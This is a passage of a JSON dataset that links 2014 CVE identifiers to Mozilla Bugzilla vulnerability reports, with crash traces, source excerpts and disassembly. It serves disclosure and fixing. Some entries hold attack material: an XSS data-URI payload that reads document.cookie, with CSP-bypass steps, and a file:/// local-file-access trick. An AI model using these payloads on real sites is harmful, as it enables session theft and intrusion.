5. On the right top menu, under the project header, find and click the display textures button to be able to view the textures in the current project. (checkered square icon). 6. Click on the now visible textures , may have to click between them swiftly. In some cases it instantly craches, in some cases after a few clicks. Actual results: FireFox crashes (shuts down instantly), followed by a dialog for submitting a crash report. Expected results: I should still be in Goo Create, with the material panel showing settings and a preview image of the selected texture."
      }
    ],
    "CVE-2014-1484": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=953993",
        "title": "Fennec leaks profile path to logcat",
        "description": "Kinda makes Bug 944373 unnecessary! Log.d(LOGTAG, \"Found profile dir: \" + mProfileDir.getAbsolutePath()); 12-29 21:40:07.011 D/GeckoProfile( 5655): Found profile dir: /data/data/org.mozilla.fennec_rnewman/files/mozilla/$hash.default"
      }
    ],
    "CVE-2014-1486": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=942164",
        "title": "imgRequestProxy Use-After-Free Remote Code Execution Vulnerability (ZDI-CAN-2036)",
        "description": "Date: Thu, 21 Nov 2013 14:21:29 -0600 From: ZDI Disclosures <zdi-disclosures@tippingpoint.com> To: security@mozilla.org Subject: ZDI-CAN-2036: New Vulnerability Report -----//----- ZDI-CAN-2036: Mozilla Firefox imgRequestProxy Use-After-Free Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 6.8, AV:N/AC:M/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- HP's Zero Day Initiative has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Flaw exists in image processing when source is set by server with content-type \"multipart/x-mixed-replace\". When new image is getting loaded, new imgRequestProxy object gets allocated by imgLoader::CreateNewProxyForRequest(): C:\\mozilla-build\\mozilla-central\\image\\src\\imgLoader.cpp:644 ------------------------------------------------------------ nsresult imgLoader::CreateNewProxyForRequest(imgRequest *aRequest, nsILoadGroup *aLoadGroup, imgINotificationObserver *aObserver, nsLoadFlags aLoadFlags, imgRequestProxy **_retval) { LOG_SCOPE_WITH_PARAM(GetImgLog(), \"imgLoader::CreateNewProxyForRequest\", \"imgRequest\", aRequest); /* XXX If we move decoding onto separate threads, we should save off the calling thread here and pass it off to |proxyRequest| so that it call proxy calls to |aObserver|. */ imgRequestProxy *proxyRequest = new imgRequestProxy(); NS_ADDREF(proxyRequest); ... Related call stack: ChildEBP RetAddr 001def64 5a89a3ae xul!imgLoader::CreateNewProxyForRequest+0x98 [c:\\mozilla-build\\mozilla-central\\image\\src\\imgloader.cpp @ 644] 001df188 5ab3dda8 xul!imgLoader::LoadImage+0xb6c [c:\\mozilla-build\\mozilla-central\\image\\src\\imgloader.cpp @ 1771] 001df1f0 5ab6d966 xul!nsContentUtils::LoadImage+0x1f8 [c:\\mozilla-build\\mozilla-central\\content\\base\\src\\nscontentutils.cpp @ 2768] 001df22c 5afea673 xul!nsDocument::MaybePreLoadImage+0xce [c:\\mozilla-build\\mozilla-central\\content\\base\\src\\nsdocument.cpp @ 8518] 001df244 5afd5689 xul!nsHtml5TreeOpExecutor::PreloadImage+0x3a [c:\\mozilla-build\\mozilla-central\\parser\\html\\nshtml5treeopexecutor.cpp @ 1076] 001df2b4 5afeb6e2 xul!nsHtml5SpeculativeLoad::Perform+0x10b [c:\\mozilla-build\\mozilla-central\\parser\\html\\nshtml5speculativeload.cpp @ 32] 001df2ec 5afd6efc xul!nsHtml5TreeOpExecutor::RunFlushLoop+0xef [c:\\mozilla-build\\mozilla-central\\parser\\html\\nshtml5treeopexecutor.cpp @ 508] 001df2f8 5b9b69a3 xul!nsHtml5ExecutorFlusher::Run+0x2d [c:\\mozilla-build\\mozilla-central\\parser\\html\\nshtml5streamparser.cpp @ 133] 001df35c 5b96f8cc xul!nsThread::ProcessNextEvent+0x298 [c:\\mozilla-build\\mozilla-central\\xpcom\\threads\\nsthread.cpp @ 622] 001df370 5b4eb8d5 xul!NS_ProcessNextEvent+0x3d [c:\\mozilla-build\\mozilla-central\\xpcom\\glue\\nsthreadutils.cpp @ 238] 001df39c 5b9f3baa xul!mozilla::ipc::MessagePump::Run+0xc9 [c:\\mozilla-build\\mozilla-central\\ipc\\glue\\messagepump.cpp @ 85] 001df3bc 5b9f40e7 xul!MessageLoop::RunInternal+0x3c [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 220] 001df3f0 5b9f45b2 xul!MessageLoop::RunHandler+0x4d [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 214] 001df410 5b44bdc1 xul!MessageLoop::Run+0x19 [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 188] 001df420 5b410231 xul!nsBaseAppShell::Run+0x47 [c:\\mozilla-build\\mozilla-central\\widget\\xpwidgets\\nsbaseappshell.cpp @ 163] 001df430 5b255735 xul!nsAppShell::Run+0x11 [c:\\mozilla-build\\mozilla-central\\widget\\windows\\nsappshell.cpp @ 113] In frame Nr.4 one can see nsDocument::MaybePreLoadImage() call: C:\\mozilla-build\\mozilla-central\\content\\base\\src\\nsDocument.cpp:8477 --------------------------------------------------------------------- void nsDocument::MaybePreLoadImage(nsIURI* uri, const nsAString &amp;aCrossOriginAttr) { // Early exit if the img is already present in the img-cache // which indicates that the \"real\" load has already started and // that we shouldn't preload it. int16_t blockingStatus; if (nsContentUtils::IsImageInCache(uri, static_cast<nsIDocument *>(this)) || !nsContentUtils::CanLoadImage(uri, static_cast<nsIDocument *>(this), this, NodePrincipal(), &amp;blockingStatus)) { return; } nsLoadFlags loadFlags = nsIRequest::LOAD_NORMAL; switch (Element::StringToCORSMode(aCrossOriginAttr)) { case CORS_NONE: // Nothing to do break; case CORS_ANONYMOUS: loadFlags |= imgILoader::LOAD_CORS_ANONYMOUS; break; case CORS_USE_CREDENTIALS: loadFlags |= imgILoader::LOAD_CORS_USE_CREDENTIALS; break; default: MOZ_CRASH(\"Unknown CORS mode!\"); } // Image not in cache - trigger preload nsRefPtr<imgRequestProxy> request; nsresult rv = nsContentUtils::LoadImage(uri, this, NodePrincipal(), mDocumentURI, // uri of document used as referrer nullptr, // no observer loadFlags, getter_AddRefs(request)); // Pin image-reference to avoid evicting it from the img-cache before // the \"real\" load occurs. Unpinned in DispatchContentLoadedEvents and // unlink if (NS_SUCCEEDED(rv)) { mPreloadingImages.AppendObject(request); } } ... This will save reference to imgRequestProxy object in mPreloadingImages. After image has loaded nsDocument::DispatchContentLoadedEvents() will be called: C:\\mozilla-build\\mozilla-central\\content\\base\\src\\nsDocument.cpp:4611 --------------------------------------------------------------------- void nsDocument::DispatchContentLoadedEvents() { // If you add early returns from this method, make sure you're // calling UnblockOnload properly. // Unpin references to preloaded images mPreloadingImages.Clear(); ... This will call imgRequestProxy::Release() and imgRequestProxy object will be freed: C:\\mozilla-build\\mozilla-central\\image\\src\\imgRequestProxy.cpp:94 ----------------------------------------------------------------- NS_IMPL_RELEASE(imgRequestProxy) ... Related call stack: ChildEBP RetAddr 001df25c 5a89e77e xul!imgRequestProxy::`scalar deleting destructor'+0x18 001df274 5a69795d xul!imgRequestProxy::Release+0x92 [c:\\mozilla-build\\mozilla-central\\image\\src\\imgrequestproxy.cpp @ 94] 001df280 5a8929ab xul!nsCOMPtr<nsIRequest>::~nsCOMPtr<nsIRequest>+0x1e [c:\\mozilla-build\\mozilla-central\\obj-i686-pc-mingw32\\dist\\include\\nscomptr.h @ 514] 001df288 5a893774 xul!nsProgressNotificationProxy::~nsProgressNotificationProxy+0x1f [c:\\mozilla-build\\mozilla-central\\image\\src\\imgloader.h @ 433] 001df29c 5b968f23 xul!nsProgressNotificationProxy::Release+0x95 [c:\\mozilla-build\\mozilla-central\\image\\src\\imgloader.cpp @ 230] 001df2b0 5b9c6b00 xul!NS_ProxyRelease+0x43 [c:\\mozilla-build\\mozilla-central\\xpcom\\glue\\nsproxyrelease.cpp @ 48] 001df2d8 5b9c6c49 xul!nsInterfaceRequestorAgg::~nsInterfaceRequestorAgg+0x35 [c:\\mozilla-build\\mozilla-central\\xpcom\\base\\nsinterfacerequestoragg.cpp @ 55] 001df2ec 5b968eb2 xul!nsInterfaceRequestorAgg::Release+0x6b [c:\\mozilla-build\\mozilla-central\\xpcom\\base\\nsinterfacerequestoragg.cpp @ 37] 001df2f8 5b9b69a3 xul!nsProxyReleaseEvent::Run+0xf [c:\\mozilla-build\\mozilla-central\\xpcom\\glue\\nsproxyrelease.cpp @ 20] 001df35c 5b96f8cc xul!nsThread::ProcessNextEvent+0x298 [c:\\mozilla-build\\mozilla-central\\xpcom\\threads\\nsthread.cpp @ 622] 001df370 5b4eb8d5 xul!NS_ProcessNextEvent+0x3d [c:\\mozilla-build\\mozilla-central\\xpcom\\glue\\nsthreadutils.cpp @ 238] 001df39c 5b9f3baa xul!mozilla::ipc::MessagePump::Run+0xc9 [c:\\mozilla-build\\mozilla-central\\ipc\\glue\\messagepump.cpp @ 85] 001df3bc 5b9f40e7 xul!MessageLoop::RunInternal+0x3c [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 220] 001df3f0 5b9f45b2 xul!MessageLoop::RunHandler+0x4d [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 214] 001df410 5b44bdc1 xul!MessageLoop::Run+0x19 [c:\\mozilla-build\\mozilla-central\\ipc\\chromium\\src\\base\\message_loop.cc @ 188] 001df420 5b410231 xul!nsBaseAppShell::Run+0x47 [c:\\mozilla-build\\mozilla-central\\widget\\xpwidgets\\nsbaseappshell.cpp @ 163] Though after imgRequestProxy is freed, another imgStatusTracker::SyncNotifyState() call will use already freed imgRequestProxy object. Triggering the bug is a bit hard, as it requires refreshing a lot of times. -- CREDIT --------------------------------------- This vulnerability was discovered by: Arthur Gerkis -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint and acquired by Hewlett-Packard, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. The ZDI does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, the ZDI provides its HP TippingPoint customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/ gpgkeys: key 556D80C193A35B1C not found on keyserver <ZDI-CAN-2036.zip.pgp>"
      }
    ],
    "CVE-2014-1489": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=959531",
        "title": "settings & history ID bug",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release) Build ID: 20131205075310 Steps to reproduce: Create an html page with the following markup: <button name=\"settings\" id=\"settings\">settings</button> <button name=\"history\" id=\"history\">history</button> Actual results: when i click on the settings button, it opens the settings of the firefox, same results for the histroy button, it opens the firefox histroy window. Expected results: It should invoke my code whether its JavaScript or any other action."
      }
    ],
    "CVE-2014-1492": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=903885",
        "title": "Hostname matching code violates RFC 6125 for IDNA",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0 (Beta/Release) Build ID: 20130803192641 Steps to reproduce: The implementation of cert_TestHostName() at http://hg.mozilla.org/mozilla-central/file/3d20597e0a07/security/nss/lib/certdb/certdb.c#l1384 does not handle IDNA domain prefixes according to RFC 6125, section 6.4.3 \"Checking of Wildcard Certificates\". http://tools.ietf.org/html/rfc6125#section-6.4.3 Actual results: A CN or subjectAltName DNS wildcard such as 'x*.example.org' should not match a IDNA A-label like 'xn--www-una.example.org'. Expected results: cert_TestHostName() should not use wildcard matching if the first fragment of a hostname is an IDNA A-label. Chromium has such a special case in http://src.chromium.org/viewvc/chrome/trunk/src/net/cert/x509_certificate.cc?revision=212341#l640"
      }
    ],
    "CVE-2014-1493": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=977538",
        "title": "MSVC with PGO still miscompiles/nops CanonicalizeNaN",
        "description": "Remember bug 859892, MSVC miscompiling the CanonicalizeNaN call in DataView.getFloat32? I fixed that bug but MSVC is still miscompiling CanonicalizeNaN. Bug 939562 enables the JITs for more chrome code and this Win32 PGO bug is causing Jetpack crashes, but the reduced testcase also crashes a normal Nightly. MSVC turns the CanonicalizeNaN call for DataView.getFloat64 into a no-op, so JS code can create arbitrary Values and this is sec-critical. For CanonicalizeNaN, MSVC with PGO generates the following code, annotated: // Prologue. mozjs!JS::CanonicalizeNaN: 680ef5f0 55 push ebp 680ef5f1 8bec mov ebp,esp 680ef5f3 83ec0c sub esp,0Ch // Move the double argument to ebp-8. Also save esi and set it to 0. 680ef5f6 dd4508 fld qword ptr [ebp+8] 680ef5f9 56 push esi 680ef5fa 33f6 xor esi,esi 680ef5fc dd5df8 fstp qword ptr [ebp-8] // Compare esi and if it's non-zero, we're done. // We just zero'ed esi so this branch is never taken. 680ef5ff 3bf6 cmp esi,esi 680ef601 7513 jne mozjs!JS::CanonicalizeNaN+0x26 (680ef616) // mozilla::IsNaN does (bits & DoubleExponentBits) == DoubleExponentBits, // so this looks reasonable. If this test fails, we're done. 680ef603 8b45fc mov eax,dword ptr [ebp-4] 680ef606 250000f07f and eax,7FF00000h 680ef60b 3d0000f07f cmp eax,7FF00000h 680ef610 0f849b911900 je mozjs!JS::CanonicalizeNaN+0x1991c1 (682887b1) // Done, return the double and restore esi. 680ef616 dd4508 fld qword ptr [ebp+8] 680ef619 5e pop esi 680ef61a c9 leave 680ef61b c3 ret The branch that's always taken is a bit weird for an opt build, but so far so good. Here's what happens when we have a NaN value and jump to 682887b1: // Load the high word in edx, low word in eax. 682887b1 8b55fc mov edx,dword ptr [ebp-4] 682887b4 8b45f8 mov eax,dword ptr [ebp-8] // mozilla::IsNaN does: (bits & DoubleSignificandBits) != 0 // DoubleSignificandBits == 0x000fffff ffffffff, so the and instruction below // makes some sense. 682887b7 81e2ffff0f00 and edx,0FFFFFh // The code below is totally bogus, we \"or\" both words, but whatever // happens we jump to \"Done.\" and return the original input. 682887bd 0bc2 or eax,edx 682887bf 0f84516ee6ff je mozjs!JS::CanonicalizeNaN+0x26 (680ef616) 682887c5 e94c6ee6ff jmp mozjs!JS::CanonicalizeNaN+0x26 (680ef616)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=958867",
        "title": "Make sure to call HoldJSObjects when setting IDBFactory::mOwningObject",
        "description": "While testing a patch for bug 958315, it revealed an sg:crit bug in IDB. We don't always end up tracing mOwningObject because of the missing HoldJSObjects(). Seems to be a regression from http://hg.mozilla.org/mozilla-central/diff/8b5e83943958/dom/indexedDB/IDBFactory.cpp (Bug 772700 added HoldJSObjects call to another ::Create method)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=896268",
        "title": "Assertion failure: NS_IsMainThread() and crash [@mozilla::image::Decoder::AllocateFrame]",
        "description": "Load the attached testcase and click the \"Ok\" button for every two popup boxes, then wait a few seconds. Assertion failure: NS_IsMainThread(), at /Users/cdiehl/dev/repos/mozilla/mozilla-inbound/image/src/Decoder.cpp:197 Tested with http://hg.mozilla.org/integration/mozilla-inbound/rev/9fd04fd70fc2"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=967341",
        "title": "\"ASSERTION: index exceeds allowable range\" - nsStandardURL::Host",
        "description": "###!!! ASSERTION: index exceeds allowable range: 'i <= mLength', file nsTString.h > frame #0: 0x0000000101622ddb XUL`nsCString::CharAt(this=0x000000012505b540, i=4294967295) const + 91 at nsTString.h:105 > frame #1: 0x00000001017d2efb XUL`nsStandardURL::Host(this=0x000000012505b500) + 91 at nsStandardURL.h:352 > frame #2: 0x00000001017c0048 XUL`nsStandardURL::GetHost(this=0x000000012505b500, result=0x00007fff5fbf6c68) + 40 at nsStandardURL.cpp:1016 > frame #3: 0x000000010332d17e XUL`mozilla::dom::URL::GetHostname(this=0x00000001262ffc70, aHostname=0x00007fff5fbf6d18) const + 126 at URL.cpp:334 > frame #4: 0x0000000102d7ffae XUL`mozilla::dom::URLBinding::get_hostname(cx=0x000000011f8c3e70, obj=Handle<JSObject *> at 0x00007fff5fbf6de0, self=0x00000001262ffc70, args=JSJitGetterCallArgs at 0x00007fff5fbf6dd0) + 94 at URLBinding.cpp:622"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=963974",
        "title": "Faulty crash: use-after-free of mCurrentCompositeTask in CompositorParent::RecvFlushRendering()",
        "description": "Found by Christoph Diehl's \"Faulty\" fuzzer, see bug 777067"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=965982",
        "title": "QuotaManager: TransactionThreadPool needs to be shutdown before we shutdown IO thread",
        "description": "IO thread shutdown involves invalidation of file managers which destroy file info objects (setting database refs to zero). The problem is that there can be a running transaction that is about to lower database refs of a file info and since the file info at that time contains invalid information/database refs, the whole process will end up with destroying already destroyed file info objects. It makes much more sense to shutdown the transaction service first and then the IO thread. This must have been a problem for long time, but not so visible. The patch for storing big structured clones in external files makes it much more visible. Ben says we should land this separately and get it possibly on aurora/beta too"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=960145",
        "title": "range analysis for phi nodes ignores OSR values",
        "description": "Range analysis for phi nodes ignores OSR value operands (see MPhi::computeRange). In the testcase in bug 960071, the loop phi has a zero constant and an OSR value. Range analysis ignores the OSR value and returns [0,0]. At runtime, the OSR edge is executed, the OSR value is 1, the phi node has value 1, and the range check fails. Ignoring OSR values seems wrong in view of this testcase. It's been this way since af9e58e86102 (bug 765119). This issue was hidden in part by a bug in --ion-check-range-analysis which caused it to neglect to check ranges on phi nodes. I've filed bug 960143 for this."
      }
    ],
    "CVE-2014-1496": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=925747",
        "title": "Files extracted from Mar file are not locked during update",
        "description": "Files like update.manifest or *.patch files arent locked and extracted in a writeable place during an update process so it is possible to change the update process. With manipulted *.patch and update.manifest files it seems to be possible to change any files which are relative to the working directory of the updater (for example the firefox directory). I have tested this behavoir in ff 24.0."
      }
    ],
    "CVE-2014-1497": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=966311",
        "title": "Out-of-bounds read in mozilla::WaveReader::DecodeAudioData()",
        "description": "Tested on: OS: Ubuntu 12.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1391177067/ Repro-file as attachment. You might need to load the wav-file with a small html wrapper like this: <html> <audio src=\"./repro-file.wav\"> </html> ASAN-report: ==20648==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6210005bdd00 at pc 0x7f84654da535 bp 0x7f843c70dc40 sp 0x7f843c70dc38 READ of size 1 at 0x6210005bdd00 thread T37 (Media Decode) #0 0x7f84654da534 in mozilla::(anonymous namespace)::ReadUint8(char const**) /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/WaveReader.cpp:106:0 #1 0x7f84654d9f0b in mozilla::WaveReader::DecodeAudioData() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/WaveReader.cpp:219:0 #2 0x7f84653d35d2 in mozilla::MediaDecoderReader::DecodeToFirstAudioData() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderReader.cpp:449:0 #3 0x7f84653d3a91 in mozilla::MediaDecoderReader::FindStartTime(long&) /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderReader.cpp:474:0 #4 0x7f84653f452f in mozilla::MediaDecoderStateMachine::FindStartTime() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderStateMachine.cpp:2653:0 #5 0x7f84653e6e56 in mozilla::MediaDecoderStateMachine::DecodeMetadata() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderStateMachine.cpp:1949:0 #6 0x7f84653e64c4 in mozilla::MediaDecoderStateMachine::DecodeThreadRun() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderStateMachine.cpp:508:0 . . . 0x6210005bdd00 is located 0 bytes to the right of 4096-byte region [0x6210005bcd00,0x6210005bdd00) allocated by thread T37 (Media Decode) here: #0 0x4463c5 in malloc _asan_rtl_:0 #1 0x7f846c8d876d in moz_xmalloc /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/memory/mozalloc/mozalloc.cpp:52:0 #2 0x7f84654d9dd7 in operator new[](unsigned long) /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/obj-firefox/content/media/wave/../../../dist/include/mozilla/mozalloc.h:213:0 #3 0x7f84654d9dd7 in mozilla::WaveReader::DecodeAudioData() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/wave/WaveReader.cpp:207:0 #4 0x7f84653d35d2 in mozilla::MediaDecoderReader::DecodeToFirstAudioData() /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderReader.cpp:449:0 #5 0x7f84653d3a91 in mozilla::MediaDecoderReader::FindStartTime(long&) /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/MediaDecoderReader.cpp:474:0 . . ."
      }
    ],
    "CVE-2014-1501": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=960135",
        "title": "local file access via Open Link in new Tab",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release) Build ID: 20131205075310 Steps to reproduce: Create a link which is using the file:/// uri <a href=\"file:///\">clickme</a> Now keep the finger on the hyperlink until a pop appears. Click on open in new tab. A new tab which points to file:/// will be opened Actual results: A new tab was openend with the local file path. If you know the path of a local file (as an example by dropping a prepared html file via a download) an attacker would be able to open and execute a local file. Expected results: The expected result should be either an empty (about:blank) new tab or no tab at all. If you right click on the same hyperlink on the the desktop version of firefox and you choose open in new tab, nothing happens."
      }
    ],
    "CVE-2014-1504": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=911547",
        "title": "data-URI + Firefox restart = CSP bypass",
        "description": "If an attacker injects a data-URI into a web application, the Content Security Policy of the linking site gets inherited. Example: <a href=\"data:text/html,<script>alert(document.cookie)</script>\">Click me</a> This attack would be mitigated with a reasonable CSP (or default-src 'none'), but the Browser will still visit the data-URI. If an attacker now manages to kill the Browser (due to bugs/exploits triggered by another tab or Addon installation or ...) Firefox will try to restore the browsing session when it is restarted. Now the data-URI will be opened in the context of the site protected with CSP but without enforcing a CSP. Steps to reproduce: 1. XSS a site with CSP enabled: http://poc.iceqll.eu/cspdata/?xss=<a+href=\"data:text/html,<script>alert(document.cookie)</script>\">Click+me</a> 2. Click the data-URI (or lure your victim into doing so). 3. Kill the Browser (after waiting a second): killall -9 firefox-bin 4. Start the Browser again. Oops. CSP bypassed? Not sure if this is really that much security critical because there are huge obstacles an attacker has to overcome (particularly killing the Browser). Tested on Nightly build 26.0a1 (2013-08-31)."
      }
    ],
    "CVE-2014-1505": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=941887",
        "title": "feDisplacementMap should check taintedness of the image with the displacements",
        "description": "Security sensitive for now since there's an information leak here that we're plugging. There is really no way to prevent timing attacks revealing information about the contents of the displacements input to feDisplacementMap. These displacements control the addresses of memory fetches into the other input image. These fetches can be made fast or slow by concentrating them into one location or by spreading them out, due to cache effects. Making all the fetches equally slow would be difficult to do and result in horrible performance. However, in many important use-cases of feDisplacementMap, we can easily prove that the displacements input image does not depend on content from a different origin than the page. So we can restrict feDisplacementMap to only work when we can prove that, instead of disabling it completely. I suggest we do the following: -- Assign an origin-clean flag to each filter primitive. By default, a filter primitive is origin-clean if and only if all of its inputs are origin-clean. (It follows that a filter primitive with no inputs is origin-clean.) -- An feImage is origin-clean if drawing <img> element with the same source to an origin-clean canvas would leave the canvas origin-clean. -- If the feDisplacementMap's displacements input is not origin-clean, it should produce transparent black."
      }
    ],
    "CVE-2014-1506": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=944374",
        "title": "Security vulnerability: CrashReporter Path Traversal",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 Steps to reproduce: Technical details can be found in the attached whitepaper. Actual results: Technical details can be found in the attached whitepaper. Expected results: Technical details can be found in the attached whitepaper."
      }
    ],
    "CVE-2014-1507": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=940684",
        "title": "Device Storage - Additional security issue with OOP on FirefoxOS",
        "description": "This is really a follow on to bug 860934 This affects a compromised child. In bug 860934, the child was able to send a fully qualified path to the parent. This was addressed by splitting the full path into a storageName which identifies the root directory, and a relative path. However, if the child were compromised, it could pass in a path which includes ../ and escape out of the storageName'd root directory. Currently, device storage does check for ..'s in the pathname, but this check is being done in the child, and not in the parent. Thanks goes to bent for identifying this."
      }
    ],
    "CVE-2014-1508": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=963198",
        "title": "out of bounds read in libxul.so!gfxContext::Polygon",
        "description": "Found by the BlackBerry Security Automated Analysis Team's fuzzing framework ALF. ==7859==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffa141ed10 at pc 0x7fb96506196c bp 0x7fffa141e850 sp 0x7fffa141e848 READ of size 8 at 0x7fffa141ed10 thread T0 #0 0x7fb96506196b (libxul.so!gfxContext::Polygon(gfxPoint const*, unsigned int)+0x39b) Line 66 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/thebes/gfx2DGlue.h\" #1 0x7fb9684f94a3 (libxul.so!nsDisplayNotation::Paint(nsDisplayListBuilder*, nsRenderingContext*)+0xa43) Line 803 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/mathml/nsMathMLmencloseFrame.cpp\" #2 0x7fb967e481c7 (libxul.so!mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, nsIntRect const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, nsIntPoint const&, float, float, int)+0xe47) Line 3487 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/FrameLayerBuilder.cpp\" #3 0x7fb967e4a4dd (libxul.so!mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*)+0x15fd) Line 3649 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/FrameLayerBuilder.cpp\" #4 0x7fb965118b41 (libxul.so!mozilla::layers::BasicThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, mozilla::layers::DrawRegionClip, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*)+0x81) Line 114 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/BasicThebesLayer.h\" #5 0x7fb9650fa5aa (libxul.so!mozilla::layers::BasicThebesLayer::Validate(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*)+0x69a) Line 208 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/BasicThebesLayer.cpp\" #6 0x7fb9650ed4bd (libxul.so!non-virtual thunk to mozilla::layers::BasicContainerLayer::Validate(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*)+0x8d) Line 124 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/BasicContainerLayer.cpp\" #7 0x7fb9650ed4bd (libxul.so!non-virtual thunk to mozilla::layers::BasicContainerLayer::Validate(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*)+0x8d) Line 124 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/BasicContainerLayer.cpp\" #8 0x7fb9650f061f (libxul.so!mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, mozilla::layers::DrawRegionClip, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags)+0x56f) Line 597 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/BasicLayerManager.cpp\" #9 0x7fb967f256ef (libxul.so!nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const+0x13bf) Line 1231 of 